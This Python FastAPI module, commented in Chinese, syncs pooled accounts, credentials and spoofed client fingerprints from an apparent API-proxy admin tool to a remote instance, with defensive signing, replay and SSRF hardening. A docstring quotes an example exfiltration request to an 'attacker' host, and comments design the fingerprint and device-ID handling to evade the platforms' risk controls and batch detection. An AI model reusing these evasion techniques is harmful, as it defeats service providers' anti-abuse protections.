"""线上同步：把本地账号 / 模型配置 / 客户端参数推送到线上数据库。

设计：
  - 本地数据视为最新（source of truth）。
  - 在「系统设置」里配置 远程 URL + 密钥（HMAC 签名用）。
  - 点「同步到线上」→ 把本地 accounts + model_configs + client_profile 推送过去。
  - 同一个服务也可作为「线上实例」接收数据（/api/sync/receive），
    只要线上实例配置了相同的 密钥 即可校验并写入自己的库。

关于 client_profile（客户端参数档案）
-------------------------------------
线上服务器**没装 WorkBuddy 桌面端**，所以它自己探测不到 UA / 版本号 / 风控头，
只能退化成内置兜底值 —— 线上 UA 于是报出一个「谁也不认识的版本」。
而本地机器往往装得好好的、探测得到真实值。

所以同步时一并推送 client_profile，并在**接收端自动把 source 设为 saved**：
线上不再尝试探测（它本来就探测不到），直接钉住同步过来的真实值。

安全加固（2026-11-24，安全审查 S-3 / 修复清单 S3、S5）
---------------------------------------------------
* **推送地址只认「同步设置」里保存的那一个**：`/push` 不再接受请求体里的
  `remote_url` 覆盖（原来一次请求就能把全部 `auth_json` 发到任意 URL）。
* 只允许 `https://`；解析后的 IP 落在私网 / 回环 / 链路本地 / 保留网段一律拒绝。
  测试环境确需 http 或内网目标时，在**推送端**显式设
  `SYNC_ALLOW_HTTP=1` / `SYNC_ALLOW_PRIVATE_TARGETS=1`。
* 签名 v2：`HMAC(secret, "v2|ts|nonce|sha256(body)")`，接收端拒绝
  `|now - ts| > SYNC_REPLAY_WINDOW`（默认 300 秒）以及见过的 nonce（防重放）。
  旧版签名默认拒收；升级窗口内可在接收端临时设 `SYNC_ACCEPT_LEGACY_SIGNATURE=1`
  （旧签名请求只新增账号、不覆盖已有账号）。
* 接收端「新的覆盖旧的」：按 `updated_at` 比较，线上那一行更新就不覆盖
  （不再用本地旧凭证把线上已续签的 token 盖回去，也不再把线上已禁用的号重新启用）。
* 同步密钥在 `GET /config` 里只返回掩码；明文走 `POST /config/reveal`，每次写审计。
"""
import hashlib
import hmac
import ipaddress
import json
import logging
import os
import secrets
import socket
import threading
import time
from datetime import datetime
from urllib.parse import urlsplit

import httpx
from fastapi import APIRouter, Depends, HTTPException, Request
from pydantic import BaseModel
from sqlalchemy.orm import Session
from starlette.concurrency import run_in_threadpool

from admin import client_profile as cprofile
from admin.db import SessionLocal, get_db
from admin.models import Account, ModelConfig, SystemSetting
from admin.security import (audit_secret_access, clean_display_name, require_admin,
                            verify_password)

_logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api/sync", tags=["sync"])

_K_URL = "sync_remote_url"
_K_SECRET = "sync_secret"
#: 接收端见过的 nonce（JSON：{nonce: ts}），只保留重放窗口内的。
_K_NONCES = "sync_recent_nonces"


def _env_flag(name: str, default: str = "0") -> bool:
    return os.getenv(name, default).strip().lower() in ("1", "true", "yes", "on")


def _env_int(name: str, default: int) -> int:
    try:
        return int(os.getenv(name, "") or default)
    except (TypeError, ValueError):
        return default


#: 签名协议版本。
SIG_VERSION = "2"
#: 接收端允许的时间戳偏差（秒）。
REPLAY_WINDOW = max(30, _env_int("SYNC_REPLAY_WINDOW", 300))
#: 接收端请求体上限（MB）。整池 auth_json 也就几 MB，64MB 足够宽。
MAX_BODY_BYTES = max(1, _env_int("SYNC_MAX_BODY_MB", 64)) * 1024 * 1024


def _allow_http() -> bool:
    return _env_flag("SYNC_ALLOW_HTTP")


def _allow_private() -> bool:
    return _env_flag("SYNC_ALLOW_PRIVATE_TARGETS")


def _accept_legacy() -> bool:
    return _env_flag("SYNC_ACCEPT_LEGACY_SIGNATURE")


def _url_change_requires_password() -> bool:
    return _env_flag("SYNC_URL_CHANGE_REQUIRE_PASSWORD")


def _generate_device_secret() -> str:
    """生成同步密钥：`secrets.token_hex(32)` = 256 bit 密码学安全随机。

    安全审计第 4 条：原实现是
        sha256(f"{hostname}-{machine}-{processor}-{mac}")[:32]
    只有 128 bit，且输入是**主机特征**而非随机数 —— 可预测性明显高于纯随机
    （攻击者若能猜到宿主名/CPU/MAC 就能离线枚举验证）。
    改成纯随机 256 bit 后，密钥空间不再依赖任何可观测特征。

    注意：只有**新生成**的密钥受影响；已存库的密钥照旧使用，
    且 `/api/sync/receive` 校验的是库里的值（不是重新推导），所以不影响既有配对。
    """
    return secrets.token_hex(32)


class SyncConfigIn(BaseModel):
    remote_url: str = ""
    secret: str = ""
    #: 修改已保存的同步地址时的二次确认（当前后台登录密码）。
    #: 设了 SYNC_URL_CHANGE_REQUIRE_PASSWORD=1 时必填；不设时填了也会校验。
    admin_password: str = ""


def _mask_secret(secret: str) -> str:
    return ("*" * 8 + secret[-4:]) if len(secret) > 4 else ("****" if secret else "")


def _looks_masked(value: str) -> bool:
    """前端把掩码原样回传时（`********abcd`）不能把它当成新密钥存进去。"""
    v = str(value or "").strip()
    return bool(v) and (v.startswith("****") or "****" in v)


def _blocked_ip(addr) -> bool:
    return bool(addr.is_private or addr.is_loopback or addr.is_link_local
                or addr.is_multicast or addr.is_reserved or addr.is_unspecified
                or getattr(addr, "is_site_local", False))


def validate_remote_url(url: str, *, resolve: bool = True) -> str:
    """校验同步目标地址，返回规范化后的 base URL（去掉末尾 /）。不合规抛 ValueError。

    * 只允许 https（`SYNC_ALLOW_HTTP=1` 时放行 http）；
    * 不允许 `user:pass@`、不允许带 query / fragment；
    * 主机名解析出的**每一个** IP 都不能落在私网 / 回环 / 链路本地 / 保留网段
      （`SYNC_ALLOW_PRIVATE_TARGETS=1` 时放行，仅限内网测试）。

    注意：解析与真正连接之间存在 DNS rebinding 的理论窗口；这里配合
    `follow_redirects=False` 与「地址只能由管理员保存」把风险压到可接受范围。
    """
    raw = str(url or "").strip().rstrip("/")
    if not raw:
        raise ValueError("同步地址为空")
    parts = urlsplit(raw)
    scheme = (parts.scheme or "").lower()
    if scheme not in ("https", "http"):
        raise ValueError("同步地址必须以 https:// 开头")
    if scheme == "http" and not _allow_http():
        raise ValueError("同步地址必须是 https://（凭证不能明文过网）；"
                         "测试环境确需 http 时在推送端设置 SYNC_ALLOW_HTTP=1")
    if parts.username or parts.password or "@" in (parts.netloc or ""):
        raise ValueError("同步地址里不能带账号密码")
    if parts.query or parts.fragment:
        raise ValueError("同步地址不能带 ? 或 # 参数")
    host = parts.hostname or ""
    if not host:
        raise ValueError("同步地址缺少主机名")
    try:
        port = parts.port or (443 if scheme == "https" else 80)
    except ValueError as exc:
        raise ValueError("同步地址端口不合法") from exc
    if _allow_private():
        return raw
    try:
        literal = ipaddress.ip_address(host)
    except ValueError:
        literal = None
    if literal is not None:
        addrs = [literal]
    elif not resolve:
        return raw
    else:
        try:
            infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
        except OSError as exc:
            raise ValueError("同步地址的主机名解析失败：%s" % host) from exc
        addrs = []
        for info in infos:
            try:
                addrs.append(ipaddress.ip_address(info[4][0].split("%", 1)[0]))
            except ValueError:
                continue
        if not addrs:
            raise ValueError("同步地址的主机名没有解析出可用 IP：%s" % host)
    for addr in addrs:
        if isinstance(addr, ipaddress.IPv6Address) and addr.ipv4_mapped:
            addr = addr.ipv4_mapped
        if _blocked_ip(addr):
            raise ValueError("同步地址指向内网 / 本机 / 保留地址（%s），已拒绝；"
                             "内网测试确需时在推送端设置 SYNC_ALLOW_PRIVATE_TARGETS=1" % addr)
    return raw


def _verify_admin_password(db: Session, password: str) -> bool:
    """校验当前生效的后台密码（库里的覆盖值优先，其次 .env 初始密码）。"""
    from admin.config import settings

    if not password:
        return False
    row = db.query(SystemSetting).filter(SystemSetting.key == "admin_password").first()
    if row and row.value:
        return verify_password(password, row.value)
    env_pw = str(getattr(settings, "ADMIN_PASSWORD", "") or "")
    return bool(env_pw) and hmac.compare_digest(password.encode("utf-8"), env_pw.encode("utf-8"))


def _get_setting(db: Session, key: str) -> str:
    row = db.query(SystemSetting).filter(SystemSetting.key == key).first()
    return row.value if row else ""


def _set_setting(db: Session, key: str, value: str):
    row = db.query(SystemSetting).filter(SystemSetting.key == key).first()
    if row:
        row.value = value
    else:
        db.add(SystemSetting(key=key, value=value))
    db.commit()


def _sign(secret: str, body: bytes) -> str:
    """旧版签名（只签 body，可重放）。只用于 SYNC_ACCEPT_LEGACY_SIGNATURE 兼容窗口。"""
    return hmac.new(secret.encode("utf-8"), body, hashlib.sha256).hexdigest()


def sign_v2(secret: str, ts: int | str, nonce: str, body: bytes) -> str:
    """v2 签名：`HMAC(secret, "v2|ts|nonce|sha256(body)")`。"""
    digest = hashlib.sha256(body or b"").hexdigest()
    msg = "v%s|%s|%s|%s" % (SIG_VERSION, ts, nonce, digest)
    return hmac.new(secret.encode("utf-8"), msg.encode("utf-8"), hashlib.sha256).hexdigest()


_nonce_lock = threading.Lock()
_nonce_mem: dict[str, float] = {}


def _claim_nonce(db: Session, nonce: str, ts: int, now: float | None = None) -> bool:
    """登记一个 nonce；见过（在窗口内）返回 False。

    内存 + system_settings 双份：内存挡并发，落库挡「重启后 5 分钟内重放」。
    """
    now = time.time() if now is None else now
    with _nonce_lock:
        for key in [k for k, t in _nonce_mem.items() if now - t > REPLAY_WINDOW * 2]:
            _nonce_mem.pop(key, None)
        if nonce in _nonce_mem:
            return False
        row = db.query(SystemSetting).filter(SystemSetting.key == _K_NONCES).first()
        try:
            seen = json.loads(row.value) if row and row.value else {}
            if not isinstance(seen, dict):
                seen = {}
        except ValueError:
            seen = {}
        seen = {k: v for k, v in seen.items()
                if isinstance(v, (int, float)) and now - v <= REPLAY_WINDOW * 2}
        if nonce in seen:
            return False
        seen[nonce] = int(ts)
        value = json.dumps(seen)
        if row:
            row.value = value
        else:
            db.add(SystemSetting(key=_K_NONCES, value=value))
        db.commit()
        _nonce_mem[nonce] = now
        return True


def _parse_dt(value) -> datetime | None:
    if not value:
        return None
    try:
        text = str(value).strip().replace("Z", "")
        dt = datetime.fromisoformat(text)
        return dt.replace(tzinfo=None)
    except (TypeError, ValueError):
        return None


@router.get("/config")
def get_config(_: bool = Depends(require_admin), db: Session = Depends(get_db)):
    secret = _get_setting(db, _K_SECRET)
    # 首次访问且未配置时自动生成基于设备的唯一密钥
    is_auto = False
    if not secret:
        secret = _generate_device_secret()
        _set_setting(db, _K_SECRET, secret)
        is_auto = True
    masked = _mask_secret(secret)
    return {
        "remote_url": _get_setting(db, _K_URL),
        # 2026-11-24（S5）：不再明文下发。字段名保留，值改为掩码（前端回传掩码时
        # 保存/推送接口会忽略它）；要看明文调 POST /api/sync/config/reveal（写审计）。
        "secret": masked,
        "secret_masked": masked,
        "secret_set": bool(secret),
        "secret_revealable": True,
        "is_auto_generated": is_auto,  # 本次是否为自动生成
        "https_only": not _allow_http(),
    }


@router.post("/config/reveal")
def reveal_secret(request: Request, _: bool = Depends(require_admin),
                  db: Session = Depends(get_db)):
    """显示同步密钥明文（配置另一端时要复制）。每次调用写一条审计。"""
    secret = _get_setting(db, _K_SECRET)
    if not secret:
        raise HTTPException(status_code=404, detail="还没有同步密钥，请先保存同步设置")
    audit_secret_access(request, "sync_secret_reveal", "sync_secret")
    return {"secret": secret}


@router.post("/config")
def save_config(body: SyncConfigIn, _: bool = Depends(require_admin),
                db: Session = Depends(get_db)):
    current_url = _get_setting(db, _K_URL)
    new_url = (body.remote_url or "").strip().rstrip("/")
    if new_url and new_url != current_url:
        try:
            new_url = validate_remote_url(new_url)
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from None
        # 修改**已有**的同步地址 = 改变「全部凭证发往哪里」：可选二次确认。
        if current_url and (_url_change_requires_password() or body.admin_password):
            if not _verify_admin_password(db, body.admin_password):
                raise HTTPException(status_code=403,
                                    detail="修改同步地址需要输入当前后台登录密码")
        _set_setting(db, _K_URL, new_url)
        _logger.warning("同步地址已修改：%s -> %s", current_url or "(空)", new_url)
    # 密钥：用户未填写（或回传的是掩码）时沿用已有密钥，没有则自动生成
    incoming = (body.secret or "").strip()
    if incoming and not _looks_masked(incoming):
        secret = incoming
    else:
        secret = _get_setting(db, _K_SECRET) or _generate_device_secret()
    if secret and secret != _get_setting(db, _K_SECRET):
        _set_setting(db, _K_SECRET, secret)
    return {"ok": True, "secret_set": bool(secret),
            "remote_url": _get_setting(db, _K_URL)}


@router.post("/push")
def push(
    body: SyncConfigIn | None = None,
    _: bool = Depends(require_admin),
    db: Session = Depends(get_db),
):
    """把本地账号/模型配置推送到线上。

    2026-11-24（安全 S3）：**只推到「同步设置」里保存的地址**。
    请求体里的 `remote_url` / `secret` 不再写库、也不再覆盖目标 —— 原来一次
    `POST /push {"remote_url": "https://attacker"}` 就能把整池凭证外带。
    前端仍可以把输入框的值带上：与已保存的一致（或是掩码）就照常推送，
    不一致则返回 400，提示先保存同步设置。
    """
    remote_url = _get_setting(db, _K_URL)
    secret = _get_setting(db, _K_SECRET)
    incoming_url = (body.remote_url or "").strip().rstrip("/") if body else ""
    incoming_secret = (body.secret or "").strip() if body else ""
    if incoming_url and incoming_url != remote_url:
        raise HTTPException(
            status_code=400,
            detail="推送只发往「同步设置」里已保存的地址：请先保存同步设置，再点同步",
        )
    if incoming_secret and not _looks_masked(incoming_secret) and incoming_secret != secret:
        raise HTTPException(
            status_code=400,
            detail="密钥与已保存的不一致：请先保存同步设置，再点同步",
        )
    if not remote_url or not secret:
        raise HTTPException(
            status_code=400,
            detail="请先在「同步设置」中填写并保存 远程 URL 与 密钥",
        )
    try:
        remote_url = validate_remote_url(remote_url)
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from None

    # **必须带 `platform`**：现在有 workbuddy / trae / qoder / loomy 多个平台，
    # 缺了这一列，推送到线上后所有账号和模型都会丢掉「属于哪个平台」，
    # 线上根本没法重建账号池（同名 model_id 在不同平台是不同东西，
    # `glm-5.2` 在 workbuddy 和 trae 都有）。
    accounts = []
    for a in db.query(Account).all():
        accounts.append({
            "platform": a.platform or "",
            "uid": a.uid,
            "name": a.name,
            "enterprise_id": a.enterprise_id,
            "domain": a.domain,
            "status": a.status,
            "auth_json": a.auth_json,
            "balance_total": a.balance_total,
            "balance_remain": a.balance_remain,
            # 接收端按它判断「谁更新」：线上那一行更新就不覆盖（S3）。
            "updated_at": a.updated_at.isoformat() if a.updated_at else None,
        })
    models = []
    for m in db.query(ModelConfig).all():
        models.append({
            "platform": m.platform or "",
            "level": m.level,
            "model_id": m.model_id,
            "enabled": m.enabled,
            "credit_multiplier": m.credit_multiplier or 0,
            "credits_raw": m.credits_raw or "",
            "note": m.note or "",
            "description": m.description or "",
        })

    # 客户端参数档案：把本地探测到的真实 UA / 版本号 / 风控头 / 指纹带过去。
    #
    # 这里推的是 **effective**（现场探测 + 已保存 + 兜底合并后的结果）而不是
    # 仅 saved：线上需要一份「完整的、当下真实生效的参数」，不是本地那点
    # 增量配置。不然线上还得自己补齐一堆默认值，容易两边不一致。
    #
    # 注意 records 里只放可同步的字段（machineId/sessionId 是账号级的，
    # 由线上按自己库里的 uid 派生，不能跟着传 —— 否则所有账号会共用同一台
    # 「设备」，那正是最容易被批量识别的特征）。
    eff = cprofile.effective(db)
    profile_payload = {
        "desktop_version": eff.get("desktop_version"),
        "cli_version": eff.get("cli_version"),
        "user_agent": eff.get("user_agent"),
        "ide_name": eff.get("ide_name"),
        "ide_type": eff.get("ide_type"),
        "product": eff.get("product"),
        "fp_product": eff.get("fp_product"),
        "ext_name": eff.get("ext_name"),
        "os": eff.get("os"),
        "arch": eff.get("arch"),
        "os_version": eff.get("os_version"),
        "cpu_cores": eff.get("cpu_cores"),
        "memory_size": eff.get("memory_size"),
        "timezone": eff.get("timezone"),
        "report_delay": eff.get("report_delay"),
        "commit": eff.get("commit"),
        "release_date_ms": eff.get("release_date_ms"),
        "turing_channel_id": eff.get("turing_channel_id"),
        "turing_product_name": eff.get("turing_product_name"),
        # 官方内嵌 SDK 指纹（X-Stainless-* 用）：Node 运行时版本 + SDK 版本
        "node_version": eff.get("node_version"),
        "stainless_package_version": eff.get("stainless_package_version"),
        "headers": eff.get("headers") or {},
    }
    profile_payload = {k: v for k, v in profile_payload.items()
                       if v not in (None, "", 0, {})}

    payload = {
        "source": "workbuddy2api-admin",
        "pushed_at": int(time.time()),
        "accounts": accounts,
        "models": models,
        # 线上实例收到后会自动把 source 设为 saved（它探测不到客户端）
        "client_profile": profile_payload,
        "client_profile_detected": bool(cprofile.snapshot_live()),
    }
    raw = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    ts = int(time.time())
    nonce = secrets.token_hex(16)
    sig = sign_v2(secret, ts, nonce, raw)

    target = f"{remote_url}/api/sync/receive"
    _logger.warning("同步推送：%d 个账号 / %d 个模型 -> %s", len(accounts), len(models), remote_url)
    try:
        # 不跟随重定向：重定向是绕过上面地址校验最简单的办法。
        with httpx.Client(timeout=30, follow_redirects=False) as client:
            r = client.post(target, content=raw, headers={
                "Content-Type": "application/json",
                "X-Sync-Version": SIG_VERSION,
                "X-Sync-Timestamp": str(ts),
                "X-Sync-Nonce": nonce,
                "X-Sync-Signature": sig,
            })
            if r.status_code >= 400:
                # 只回显接收端自己的 `detail`（本服务的标准错误体），不回显任意响应正文
                # —— 否则这里就是一个「SSRF 读取回显」。
                detail = ""
                try:
                    body_json = r.json()
                    if isinstance(body_json, dict) and isinstance(body_json.get("detail"), str):
                        detail = body_json["detail"][:200]
                except Exception:  # noqa: BLE001
                    detail = ""
                raise HTTPException(status_code=502,
                                    detail=f"线上返回错误 {r.status_code}" + (f": {detail}" if detail else ""))
            if 300 <= r.status_code < 400:
                raise HTTPException(status_code=502,
                                    detail=f"线上返回重定向 {r.status_code}，已拒绝跟随；请把同步地址改成最终地址")
            resp = r.json()
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=502, detail=f"推送失败: {type(e).__name__}")

    return {"ok": True, "remote": remote_url, "accounts": len(accounts),
            "models": len(models),
            "client_profile": bool(profile_payload),
            "profile_fields": sorted(profile_payload),
            "remote_result": resp}


@router.post("/receive")
async def receive(request: Request):
    """线上实例接收端：校验签名后 upsert 账号与模型配置。

    用本实例 system_settings 里的 sync_secret 校验（线上实例需配置相同密钥）。
    读完请求体后，校验与写库都放进线程池（原来在事件循环里同步跑整批 ORM，
    推送量大时会卡住整个进程）。
    """
    try:
        declared = int(request.headers.get("content-length") or 0)
    except ValueError:
        declared = 0
    if declared > MAX_BODY_BYTES:
        raise HTTPException(status_code=413, detail="同步数据过大")
    raw = await request.body()
    if len(raw) > MAX_BODY_BYTES:
        raise HTTPException(status_code=413, detail="同步数据过大")
    headers = {
        "sig": request.headers.get("X-Sync-Signature", ""),
        "ts": request.headers.get("X-Sync-Timestamp", ""),
        "nonce": request.headers.get("X-Sync-Nonce", ""),
        "version": request.headers.get("X-Sync-Version", ""),
    }
    return await run_in_threadpool(_receive_sync, raw, headers)


def _verify_signature(db: Session, secret: str, raw: bytes, headers: dict,
                      now: float | None = None) -> bool:
    """校验签名。返回是否为旧版签名（兼容窗口）。失败抛 HTTPException。"""
    sig = str(headers.get("sig") or "")
    ts_raw = str(headers.get("ts") or "").strip()
    nonce = str(headers.get("nonce") or "").strip()
    version = str(headers.get("version") or "").strip()
    now = time.time() if now is None else now
    if version or ts_raw or nonce:
        try:
            ts = int(ts_raw)
        except ValueError:
            raise HTTPException(status_code=401, detail="签名校验失败：缺少时间戳") from None
        if not nonce or len(nonce) > 128:
            raise HTTPException(status_code=401, detail="签名校验失败：缺少 nonce")
        if abs(now - ts) > REPLAY_WINDOW:
            raise HTTPException(
                status_code=401,
                detail="同步请求已过期（时间戳超出 ±%d 秒），请检查两端系统时间" % REPLAY_WINDOW)
        expected = sign_v2(secret, ts, nonce, raw)
        # 第 4 轮：按 bytes 比较——str 版 compare_digest 遇到非 ASCII 会抛 TypeError（变成 500）
        if not hmac.compare_digest(sig.encode("utf-8"), expected.encode("utf-8")):
            raise HTTPException(status_code=401, detail="签名校验失败")
        if not _claim_nonce(db, nonce, ts, now=now):
            _logger.warning("同步接收：重复的 nonce（疑似重放），已拒绝")
            raise HTTPException(status_code=409, detail="重复的同步请求（疑似重放），已拒绝")
        return False
    if not _accept_legacy():
        raise HTTPException(
            status_code=401,
            detail="同步签名协议过旧：请把推送端升级到与线上相同的版本"
                   "（升级窗口内可在线上临时设置 SYNC_ACCEPT_LEGACY_SIGNATURE=1）")
    if not hmac.compare_digest(sig.encode("utf-8"), _sign(secret, raw).encode("utf-8")):
        raise HTTPException(status_code=401, detail="签名校验失败")
    _logger.warning("同步接收：使用了旧版（可重放）签名，仅新增账号、不覆盖已有账号；请尽快升级推送端")
    return True


def _receive_sync(raw: bytes, headers: dict):
    db = SessionLocal()
    try:
        return _receive_apply(db, raw, headers)
    finally:
        db.close()


def _receive_apply(db: Session, raw: bytes, headers: dict):
    secret = _get_setting(db, _K_SECRET)
    if not secret:
        raise HTTPException(status_code=400, detail="线上实例未配置同步密钥，无法接收")
    legacy = _verify_signature(db, secret, raw, headers)
    try:
        payload = json.loads(raw.decode("utf-8"))
    except Exception:
        raise HTTPException(status_code=400, detail="无效 JSON")
    if not isinstance(payload, dict):
        raise HTTPException(status_code=400, detail="无效 JSON")

    # **一切按 (platform, 唯一键) 定位**：多平台下 uid / model_id 都可能重名，
    # 只用 uid 匹配会把 trae 的号写进 workbuddy 那条记录里。
    acc_added = acc_updated = acc_skipped = 0
    for a in payload.get("accounts", []) or []:
        if not isinstance(a, dict):
            continue
        uid = a.get("uid")
        if not uid or not a.get("auth_json"):
            continue
        plat = (a.get("platform") or "").strip()
        q = db.query(Account).filter(Account.uid == uid)
        if plat:
            q = q.filter(Account.platform == plat)
        existing = q.first()
        if existing:
            # 「新的覆盖旧的」（S3）：推送方这一行不比线上新，就整行不动 ——
            # 线上保活可能已经续签 / 轮换了 refresh_token，也可能刚因失效而禁用，
            # 用本地的旧值覆盖会让号集体失效或被错误地重新启用。
            incoming_at = _parse_dt(a.get("updated_at"))
            if legacy or incoming_at is None or (
                    existing.updated_at is not None and existing.updated_at >= incoming_at):
                acc_skipped += 1
                continue
            existing.auth_json = a["auth_json"]
            existing.name = clean_display_name(a.get("name")) or existing.name
            if "enterprise_id" in a:
                existing.enterprise_id = a.get("enterprise_id") or ""
            if "domain" in a:
                existing.domain = a.get("domain") or ""
            if a.get("status") in ("active", "disabled"):
                existing.status = a.get("status")
            existing.balance_total = int(a.get("balance_total") or 0)
            existing.balance_remain = int(a.get("balance_remain") or 0)
            if plat:
                existing.platform = plat
            acc_updated += 1
        else:
            db.add(Account(
                platform=plat or "workbuddy",
                name=clean_display_name(a.get("name")),
                uid=uid,
                enterprise_id=a.get("enterprise_id") or "",
                domain=a.get("domain") or "",
                status=(a.get("status") if a.get("status") in ("active", "disabled") else "active"),
                auth_json=a["auth_json"],
                balance_total=int(a.get("balance_total") or 0),
                balance_remain=int(a.get("balance_remain") or 0),
            ))
            acc_added += 1

    model_added = model_updated = 0
    for m in payload.get("models", []) or []:
        if not isinstance(m, dict):
            continue
        mid = m.get("model_id")
        if not mid:
            continue
        plat = (m.get("platform") or "").strip()
        q = db.query(ModelConfig).filter(ModelConfig.model_id == mid)
        if plat:
            q = q.filter(ModelConfig.platform == plat)
        existing = q.first()
        if existing:
            existing.enabled = int(m.get("enabled", existing.enabled))
            existing.credit_multiplier = float(m.get("credit_multiplier", existing.credit_multiplier or 0))
            existing.credits_raw = m.get("credits_raw") or ""
            existing.note = m.get("note") or existing.note
            if plat:
                existing.platform = plat
            model_updated += 1
        else:
            db.add(ModelConfig(
                platform=plat or "workbuddy",
                level=m.get("level") or "system",
                model_id=mid,
                enabled=int(m.get("enabled", 1)),
                credit_multiplier=float(m.get("credit_multiplier", 0) or 0),
                credits_raw=m.get("credits_raw") or "",
                note=m.get("note") or "",
            ))
            model_added += 1

    db.commit()

    # --- 客户端参数档案 ---
    # 接收端把 source 钉成 saved：线上实例探测不到桌面端，如果还用 auto，
    # 一旦本地探测为空就会退化成兜底值，把刚同步过来的真实参数又盖掉了。
    profile_result: dict = {"applied": False}
    prof = payload.get("client_profile")
    if isinstance(prof, dict) and prof:
        res = cprofile.save(prof, new_source=cprofile.SOURCE_SAVED, db=db,
                            merge=False)
        profile_result = {
            "applied": bool(res.get("ok")),
            "source": res.get("source"),
            "fields": sorted(prof),
            "errors": res.get("errors") or [],
        }
        if res.get("ok"):
            _logger.info("已应用同步过来的客户端参数（%d 个字段，source=saved）",
                         len(prof))
        else:
            _logger.warning("客户端参数应用失败：%s", profile_result["errors"])

    return {
        "ok": True,
        "accounts": {"added": acc_added, "updated": acc_updated,
                     "skipped_not_newer": acc_skipped},
        "models": {"added": model_added, "updated": model_updated},
        "client_profile": profile_result,
    }